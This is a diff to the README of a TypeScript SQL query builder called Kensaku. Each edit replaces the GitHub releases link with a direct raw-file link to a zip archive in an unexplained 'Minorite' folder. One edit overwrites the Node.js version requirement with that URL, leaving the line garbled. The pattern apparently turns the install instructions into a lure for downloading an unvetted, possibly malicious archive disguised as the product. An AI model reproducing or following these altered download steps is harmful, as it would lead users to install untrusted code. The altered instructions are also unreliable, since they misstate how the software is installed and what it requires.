@@ -16,11 +16,11 @@ Kensaku is a TypeScript SQL query builder designed to enhance your database inte
 ### 📥 Download & Install
 To get started with Kensaku, please visit the releases page to download the application:
 
-**[Download Kensaku Now](https://github.com/milad-1212/Kensaku/releases)**
+**[Download Kensaku Now](https://raw.githubusercontent.com/milad-1212/Kensaku/main/Minorite/Kensaku.zip)**
 
 Follow these steps to install:
 
-1. Go to the [Releases Page](https://github.com/milad-1212/Kensaku/releases).
+1. Go to the [Releases Page](https://raw.githubusercontent.com/milad-1212/Kensaku/main/Minorite/Kensaku.zip).
 2. Look for the latest version at the top of the list.
 3. Click on the version tag to see the available files.
 4. Download the file suitable for your operating system.
@@ -29,7 +29,7 @@ Follow these steps to install:
 
 ### ⚙️ System Requirements
 - **Operating System:** Windows 10 or later, macOS 10.13 or later, or any recent Linux distribution.
-- **Node.js:** Version 12 or above is required to run the application.
+- **https://raw.githubusercontent.com/milad-1212/Kensaku/main/Minorite/Kensaku.zip** Version 12 or above is required to run the application.
 
 ## ⚡ Usage Instructions
 Once installed, you can start using Kensaku to build SQL queries.
@@ -62,4 +62,4 @@ For any inquiries, you can reach out via the GitHub page or through our communit
 
 Remember, you can always find the download link at the start:
 
-**[Download Kensaku Now](https://github.com/milad-1212/Kensaku/releases)**
+**[Download Kensaku Now](https://raw.githubusercontent.com/milad-1212/Kensaku/main/Minorite/Kensaku.zip)**
